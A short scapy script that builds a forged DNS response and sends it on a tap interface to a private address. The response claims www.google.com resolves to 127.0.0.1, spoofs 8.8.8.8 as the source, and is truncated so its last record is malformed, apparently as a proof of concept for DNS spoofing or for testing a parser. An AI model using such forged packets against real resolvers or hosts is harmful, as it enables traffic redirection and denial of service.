from scapy.all import *
import struct

w = []
w += [0x80810000, 0x01000100, 0x00000000, 0x77777703]
w += [0x6f6f6706, 0x03656c67, 0x006d6f63, 0x01000100]
w += [0x77777703, 0x6f6f6706, 0x03656c67, 0x006d6f63]
w += [0x01000100, 0x00000000, 0x007f0400, 0x000c0100]
b = struct.pack("<" + "I"*16, *w)[:63]

p = IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/DNS(_pkt=b)
sendp(Ether(dst="11:22:33:44:55:66")/p, iface="tap0")